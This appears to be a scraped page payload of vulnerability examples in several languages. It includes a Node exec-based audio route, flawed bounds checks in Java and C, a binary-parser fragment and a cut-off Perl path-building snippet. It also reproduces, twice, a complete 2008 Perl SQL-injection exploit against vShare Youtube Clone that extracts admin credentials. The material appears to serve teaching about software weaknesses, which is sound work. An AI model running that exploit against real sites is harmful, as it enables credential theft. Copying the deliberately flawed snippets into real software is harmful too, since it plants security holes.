\u003cspan class=\"token number\"\u003e1024\u003c/span\u003e \u003cspan class=\"token operator\"\u003e*\u003c/span\u003e \u003cspan class=\"token number\"\u003e1000\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token comment\"\u003e// 1 mb buffer\u003c/span\u003e\n    \u003cspan class=\"token literal-property property\"\u003ecwd\u003c/span\u003e\u003cspan class=\"token operator\"\u003e:\u003c/span\u003e \u003cspan class=\"token string\"\u003e'/tmp/'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e\n    \u003cspan class=\"token literal-property property\"\u003etimeout\u003c/span\u003e\u003cspan class=\"token operator\"\u003e:\u003c/span\u003e \u003cspan class=\"token number\"\u003e60000\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token comment\"\u003e// 1 minute timeout\u003c/span\u003e\n    \u003cspan class=\"token literal-property property\"\u003eencoding\u003c/span\u003e\u003cspan class=\"token operator\"\u003e:\u003c/span\u003e \u003cspan class=\"token string\"\u003e'buffer'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e\n  \u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\n  \u003cspan class=\"token function\"\u003eexec\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003ecmd\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e options\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token parameter\"\u003eerr\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e stdout\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e stderr\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003e\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n  \u003cspan class=\"token keyword\"\u003econst\u003c/span\u003e child \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token function\"\u003eexec\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token constant\"\u003eSYNTH_SCRIPT\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e options\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token parameter\"\u003eerr\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e stdout\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e stderr\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003e\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003econst\u003c/span\u003e errMsg \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e utils\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token function\"\u003egetExecErrorMessage\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003eerr\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e stderr\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003eif\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003eerrMsg\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n      \u003cspan class=\"token keyword\"\u003ereturn\u003c/span\u003e res\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token function\"\u003estatus\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token number\"\u003e500\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token function\"\u003esend\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003eerrMsg\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\n    res\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token function\"\u003estatus\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token number\"\u003e200\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    res\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token function\"\u003eset\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e'Content-Type'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token string\"\u003e'audio/wav'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003econst\u003c/span\u003e data \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e type \u003cspan class=\"token operator\"\u003e===\u003c/span\u003e \u003cspan class=\"token string\"\u003e'base64'\u003c/span\u003e \u003cspan class=\"token operator\"\u003e?\u003c/span\u003e stdout\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token function\"\u003etoString\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e'base64'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token operator\"\u003e:\u003c/span\u003e stdout\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003ereturn\u003c/span\u003e res\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token function\"\u003esend\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003edata\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n  \u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n  child\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003estdin\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token function\"\u003ewrite\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003esanitizedText\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n  child\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003estdin\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token function\"\u003eend\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\nmodule\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003eexports \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e router\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n"])</script><script>self.__next_f.push([1,"21:T685,\u003cspan class=\"token keyword\"\u003eprivate\u003c/span\u003e \u003cspan class=\"token keyword\"\u003evoid\u003c/span\u003e \u003cspan class=\"token function\"\u003ebuildList\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token keyword\"\u003eint\u003c/span\u003e untrustedListSize\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n\u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003eif\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token number\"\u003e0\u003c/span\u003e \u003cspan class=\"token operator\"\u003e\u003e\u003c/span\u003e untrustedListSize\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"token function\"\u003edie\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"Negative value supplied for list size, die evil hacker!\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\n    \u003cspan class=\"token class-name\"\u003eWidget\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e[\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e]\u003c/span\u003e list \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token keyword\"\u003enew\u003c/span\u003e \u003cspan class=\"token class-name\"\u003eWidget\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e[\u003c/span\u003euntrustedListSize\u003cspan class=\"token punctuation\"\u003e]\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    list\u003cspan class=\"token punctuation\"\u003e[\u003c/span\u003e\u003cspan class=\"token number\"\u003e0\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e]\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token keyword\"\u003enew\u003c/span\u003e \u003cspan class=\"token class-name\"\u003eWidget\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\n22:T4cd,#!/usr/bin/perl\n# Coded by: Saime\n# vShare Youtube Clone v2.6 (group_posts.php tid) Remote SQL Injection\n# Author: Saime\n# URL: http://www.buyscripts.in\n# Price: $10.00\n# Date: 8/05/2008\n# Greetz: BaKo,DrWh4x,optiplex,xprog,cam-man-dan,Tulle,t0pP8uZz,Inspiratio,Novalok,illuz1oN,Untamed and everyone else I forgot!\n# Site: http://h4ck-y0u.org\n\nuse LWP;\n\n$site = @"])</script><script>self.__next_f.push([1,"ARGV[0];\n$ua = LWP::UserAgent-\u003enew;\n\nmy $injection = 'group_posts.php?tid=1+union+select+1,2,3,4,concat(username,0x3a,email,0x3a,pwd),6,7+from+signup+limit+0,1--';\nif (@ARGV \u003c 1)\n{\n    \u0026usage;\n}\nelse\n{\n    \u0026exploit()\n}\n\nsub exploit()\n{\n    print \"[+] Exploiting...\\n\";\n    $passres = $ua-\u003eget(\"http://$site/$injection\");\n    $exploitcon = $passres-\u003econtent;\n    if ($exploitcon =~ m/\u003cb\u003eTopic:\u003c\\/b\u003e(.*)\u003cb\u003e(.*):(.*):([a-f0-9]{32})\u003c\\/b\u003e\u003cbr \\/\u003e/gmi)\n    {\n        $pass = $4;\n        $admin = $2;\n        $email = $3;\n        print \"[+] Admin Password: $pass\\n\";\n        print \"[+] Admin Username: $admin\\n\";\n        print \"[+] Admin Email: $email\\n\";\n    }\n    else\n    {\n        print \"[-] Unable To Get The Password...\\n\";\n        exit(0);\n    }\n}\nsub usage()\n{\n    print \"Usage: ./vshare.pl [host]\\n\";\n    print \"Example: ./vshare.pl www.site.com\\n\";\n    exit(0);\n}\n23:T1673,"])</script><script>self.__next_f.push([1,"\u003cspan class=\"token comment\"\u003e#!/usr/bin/perl\u003c/span\u003e\n\u003cspan class=\"token comment\"\u003e# Coded by: Saime\u003c/span\u003e\n\u003cspan class=\"token comment\"\u003e# vShare Youtube Clone v2.6 (group_posts.php tid) Remote SQL Injection\u003c/span\u003e\n\u003cspan class=\"token comment\"\u003e# Author: Saime\u003c/span\u003e\n\u003cspan class=\"token comment\"\u003e# URL: http://www.buyscripts.in\u003c/span\u003e\n\u003cspan class=\"token comment\"\u003e# Price: $10.00\u003c/span\u003e\n\u003cspan class=\"token comment\"\u003e# Date: 8/05/2008\u003c/span\u003e\n\u003cspan class=\"token comment\"\u003e# Greetz: BaKo,DrWh4x,optiplex,xprog,cam-man-dan,Tulle,t0pP8uZz,Inspiratio,Novalok,illuz1oN,Untamed and everyone else I forgot!\u003c/span\u003e\n\u003cspan class=\"token comment\"\u003e# Site: http://h4ck-y0u.org\u003c/span\u003e\n\n\u003cspan class=\"token keyword\"\u003euse\u003c/span\u003e LWP\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\n\u003cspan class=\"token variable\"\u003e$site\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token variable\"\u003e@ARGV\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e[\u003c/span\u003e\u003cspan class=\"token number\"\u003e0\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e]\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\u003cspan class=\"token variable\"\u003e$ua\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e LWP\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003eUserAgent\u003cspan class=\"token operator\"\u003e-\u003e\u003c/span\u003enew\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\n\u003cspan class=\"token keyword\"\u003emy\u003c/span\u003e \u003cspan class=\"token variable\"\u003e$injection\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token string\"\u003e'group_posts.php?tid=1+union+select+1,2,3,4,concat(username,0x3a,email,0x3a,pwd),6,7+from+signup+limit+0,1--'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\u003cspan class=\"token keyword\"\u003eif\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token variable\"\u003e@ARGV\u003c/span\u003e \u003cspan class=\"token operator\"\u003e\u0026lt;\u003c/span\u003e \u003cspan class=\"token number\"\u003e1\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n\u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"token variable\"\u003e\u0026amp;usage\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\n\u003cspan class=\"token keyword\"\u003eelse\u003c/span\u003e\n\u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"token variable\"\u003e\u0026amp;exploit\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n\u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\n\n\u003cspan class=\"token keyword\"\u003esub\u003c/span\u003e \u003cspan class=\"token function\"\u003eexploit\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n\u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003eprint\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"[+] Exploiting...\\n\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"token variable\"\u003e$passres\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token variable\"\u003e$ua\u003c/span\u003e\u003cspan class=\"token operator\"\u003e-\u003e\u003c/span\u003eget\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"http://$site/$injection\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"token variable\"\u003e$exploitcon\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token variable\"\u003e$passres\u003c/span\u003e\u003cspan class=\"token operator\"\u003e-\u003e\u003c/span\u003econtent\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003eif\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token variable\"\u003e$exploitcon\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=~\u003c/span\u003e \u003cspan class=\"token regex\"\u003em/\u0026lt;b\u003eTopic:\u0026lt;\\/b\u003e(.*)\u0026lt;b\u003e(.*):(.*):([a-f0-9]{32})\u0026lt;\\/b\u003e\u0026lt;br \\/\u003e/gmi\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"token variable\"\u003e$pass\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token variable\"\u003e$4\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n        \u003cspan class=\"token variable\"\u003e$admin\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token variable\"\u003e$2\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n        \u003cspan class=\"token variable\"\u003e$email\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token variable\"\u003e$3\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n        \u003cspan class=\"token keyword\"\u003eprint\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"[+] Admin Password: $pass\\n\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n        \u003cspan class=\"token keyword\"\u003eprint\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"[+] Admin Username: $admin\\n\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n        \u003cspan class=\"token keyword\"\u003eprint\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"[+] Admin Email: $email\\n\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003eelse\u003c/span\u003e\n    \u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"token keyword\"\u003eprint\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"[-] Unable To Get The Password...\\n\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n        exit\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token number\"\u003e0\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\n\u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\n\u003cspan class=\"token keyword\"\u003esub\u003c/span\u003e \u003cspan class=\"token function\"\u003eusage\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n\u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003eprint\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"Usage: ./vshare.pl [host]\\n\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003eprint\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"Example: ./vshare.pl www.site.com\\n\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    exit\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token number\"\u003e0\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\n"])</script><script>self.__next_f.push([1,"24:T8a0,"])</script><script>self.__next_f.push([1,"\u003cspan class=\"token keyword\"\u003eint\u003c/span\u003e \u003cspan class=\"token function\"\u003egetValueFromArray\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token keyword\"\u003eint\u003c/span\u003e \u003cspan class=\"token operator\"\u003e*\u003c/span\u003earray\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token keyword\"\u003eint\u003c/span\u003e len\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token keyword\"\u003eint\u003c/span\u003e index\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n\u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003eint\u003c/span\u003e value\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\n    \u003cspan class=\"token comment\"\u003e// check that the array index is less than the maximum\u003c/span\u003e\n    \u003cspan class=\"token comment\"\u003e// length of the array\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003eif\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003eindex \u003cspan class=\"token operator\"\u003e\u0026lt;\u003c/span\u003e len\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n\n        \u003cspan class=\"token comment\"\u003e// get the value at the specified index of the array\u003c/span\u003e\n        value \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e array\u003cspan class=\"token punctuation\"\u003e[\u003c/span\u003eindex\u003cspan class=\"token punctuation\"\u003e]\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\n\n    \u003cspan class=\"token comment\"\u003e// if array index is invalid then output error message\u003c/span\u003e\n    \u003cspan class=\"token comment\"\u003e// and return value indicating error\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003eelse\u003c/span\u003e\n    \u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"token function\"\u003eprintf\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"Value is: %d\\n\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e array\u003cspan class=\"token punctuation\"\u003e[\u003c/span\u003eindex\u003cspan class=\"token punctuation\"\u003e]\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n        value \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token operator\"\u003e-\u003c/span\u003e\u003cspan class=\"token number\"\u003e1\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\n\n    \u003cspan class=\"token keyword\"\u003ereturn\u003c/span\u003e value\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\n"])</script><script>self.__next_f.push([1,"25:T908,"])</script><script>self.__next_f.push([1,"\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\noffset \u003cspan class=\"token operator\"\u003e+=\u003c/span\u003e \u003cspan class=\"token number\"\u003e6\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\u003cspan class=\"token keyword\"\u003eif\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003eattr\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n    attr\u003cspan class=\"token operator\"\u003e-\u003e\u003c/span\u003etype \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e R_BIN_JAVA_ATTR_TYPE_BOOTSTRAP_METHODS_ATTR\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003eif\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003eoffset \u003cspan class=\"token operator\"\u003e+\u003c/span\u003e \u003cspan class=\"token number\"\u003e8\u003c/span\u003e \u003cspan class=\"token operator\"\u003e\u003e\u003c/span\u003e sz\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e  \u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"token function\"\u003efree\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003eattr\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n        \u003cspan class=\"token keyword\"\u003ereturn\u003c/span\u003e \u003cspan class=\"token constant\"\u003eNULL\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\n    attr\u003cspan class=\"token operator\"\u003e-\u003e\u003c/span\u003einfo\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003ebootstrap_methods_attr\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003enum_bootstrap_methods \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token function\"\u003eR_BIN_JAVA_USHORT\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003ebuffer\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e offset\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    offset \u003cspan class=\"token operator\"\u003e+=\u003c/span\u003e \u003cspan class=\"token number\"\u003e2\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    attr\u003cspan class=\"token operator\"\u003e-\u003e\u003c/span\u003einfo\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003ebootstrap_methods_attr\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003ebootstrap_methods \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token function\"\u003er_list_newf\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003er_bin_java_bootstrap_method_free\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\n"])</script><script>self.__next_f.push([1,"26:T86f,"])</script><script>self.__next_f.push([1,"\u003cspan class=\"token keyword\"\u003emy\u003c/span\u003e \u003cspan class=\"token variable\"\u003e$dataPath\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"/users/cwe/profiles\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\u003cspan class=\"token keyword\"\u003emy\u003c/span\u003e \u003cspan class=\"token variable\"\u003e$username\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e param\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"user\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\u003cspan class=\"token keyword\"\u003emy\u003c/span\u003e \u003cspan class=\"token variable\"\u003e$profilePath\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token variable\"\u003e$dataPath\u003c/span\u003e\u003cspan class=\"token operator\"\u003e.\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"/\"\u003c/span\u003e\u003cspan class=\"token operator\"\u003e.\u003c/span\u003e\u003cspan class=\"token variable\"\u003e$username\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\nopen\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token keyword\"\u003emy\u003c/span\u003e \u003cspan class=\"token variable\"\u003e$fh\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token 